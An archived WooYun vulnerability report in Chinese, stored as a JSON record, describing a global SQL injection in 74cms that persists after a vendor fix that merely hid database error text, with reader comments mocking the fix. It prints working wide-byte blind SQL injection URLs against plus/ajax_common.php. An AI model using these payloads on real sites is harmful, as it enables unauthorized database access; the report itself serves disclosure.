{"id": 18345, "wybug_id": "wooyun-2015-0105759", "wybug_title": "74cms(20150209)最新全局SQL注入（官方奇葩修复案例）", "wybug_corp": "74c,s.com", "wybug_author": "Xser", "wybug_date": "2015-04-08 15:53", "wybug_open_date": "2015-07-12 22:54", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-04-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-04-13：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-06-07：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-06-17：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-06-27：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-07-12：\t细节向公众公开  简要描述： 由于修复不巧当，还是可以继续注入的！ 详细说明：  这个漏洞，我们看看骑士怎么修复的 WooYun: 74cms(20141020)全局SQL注入过滤绕过 首先试试带入单引号，用宽字节试试，可以看到显示数据库出错\n\n看看数据库怎么带入的吧可以看到出错了，单引号被带入sql语句了\n\n居然还可以注入，没有过滤找到/include/mysql.class.php中最下面\nfunction dbshow($err)\t{    \tif($err){    \t\t$info = \"Error：\".$err;\t\t\t    \t}else{    \t\t$info = \"Errno：\".$this->errno().\" Error：\".$this->error();    \t}    \t//exit($info);        exit(\"数据库错误,请联系网站管理员！\");    }\n只是把显错换成了数据库错误,请联系网站管理员！这种修复方式我也是醉了，虽然是改了显错，但是我们的语句还是可以执行的，可以用盲注http://127.0.0.1/upload1/plus/ajax_common.php?act=hotword&query=%88%ec%27%20||%20left(version(),1)%20between%200%20and%2050--%20a这样猜解数据库版本第一位是0到5之间，返回内容http://127.0.0.1/upload1/plus/ajax_common.php?act=hotword&query=%88%ec%27%20||%20left(version(),1)%20between%200%20and%2040--%20a这样猜解数据库版本第一位是0到4之间，返回空白因为mysql是5.0以上的版本   漏洞证明：  这个漏洞，我们看看骑士怎么修复的 WooYun: 74cms(20141020)全局SQL注入过滤绕过 首先试试带入单引号，用宽字节试试，可以看到显示数据库出错\n\n看看数据库怎么带入的吧可以看到出错了，单引号被带入sql语句了\n\n居然还可以注入，没有过滤找到/include/mysql.class.php中最下面\nfunction dbshow($err)\t{    \tif($err){    \t\t$info = \"Error：\".$err;\t\t\t    \t}else{    \t\t$info = \"Errno：\".$this->errno().\" Error：\".$this->error();    \t}    \t//exit($info);        exit(\"数据库错误,请联系网站管理员！\");    }\n只是把显错换成了数据库错误,请联系网站管理员！这种修复方式我也是醉了，虽然是改了显错，但是我们的语句还是可以执行的，可以用盲注http://127.0.0.1/upload1/plus/ajax_common.php?act=hotword&query=%88%ec%27%20||%20left(version(),1)%20between%200%20and%205--%20a这样猜解数据库版本第一位是0到5之间，返回内容http://127.0.0.1/upload1/plus/ajax_common.php?act=hotword&query=%88%ec%27%20||%20left(version(),1)%20between%200%20and%204--%20a这样猜解数据库版本第一位是0到4之间，返回空白因为mysql是5.0以上的版本   修复方案：  过滤啊   版权声明：转载请注明来源 Xser@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2015-07-12 22:54 厂商回复：  漏洞Rank：18  (WooYun评价) 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-04-08 15:54 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  这修复，前无古人，后无来者了吧    \n     2015-04-08 15:57 |    \t\tFinger  \t\t\t( 普通白帽子  |\t\t\t        Rank:777 漏洞数:95        | 最近有人冒充该账号行骗，任何自称Finger并...)\t\t \n  神修复 服！    \n     2015-04-08 16:04 |    \t\t子非海绵宝宝  \t\t\t( 核心白帽子 |\t\t\t        Rank:1044 漏洞数:106        | 发扬海绵宝宝的精神!你不是海绵宝宝,你怎...)\t\t \n  关注下....    \n     2015-04-08 16:06 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  好像很火的样子~    \n     2015-04-08 16:08 |    \t\t玉林嘎 \t\t\t( 普通白帽子  |\t\t\t        Rank:758 漏洞数:96        )\t\t \n  mark    \n     2015-04-08 16:09 |    \t\tfelixk3y \t\t\t( 普通白帽子  |\t\t\t        Rank:523 漏洞数:41        | php python jsp)\t\t \n  跪了,程序员被开的节奏...    \n     2015-04-08 16:13 |    \t\txiaoL \t\t\t( 普通白帽子  |\t\t\t        Rank:361 漏洞数:67        | PKAV技术宅社区!Blog:http://www.xlixli....)\t\t \n  原来74cms这么水- -    \n     2015-04-08 16:28 |    \t\t浅蓝 \t\t\t( 普通白帽子  |\t\t\t        Rank:274 漏洞数:109        | 爱安全:www.ixsec.orgXsec社区:zone.ixse...)\t\t \n  mark    \n     2015-06-18 10:35 |    \t\tluwikes \t\t\t( 普通白帽子  |\t\t\t        Rank:512 漏洞数:77        | 潜心学习~~~)\t\t \n  原来可以这样修复，好调皮    \n     2015-06-18 10:43 |    \t\tca1n \t\t\t( 普通白帽子  |\t\t\t        Rank:100 漏洞数:22        | not yet)\t\t \n  提醒：级别足够但是无法查看 Rank 高于自己的白帽子漏洞 ( 可以等待进一步公开或者支付 9 个乌云币提前查看    \n     2015-07-12 21:23 |    \t\t冰麒麟 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 就算是男孩子,只要可爱就没问题了.)\t\t \n  好思路wwwww    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}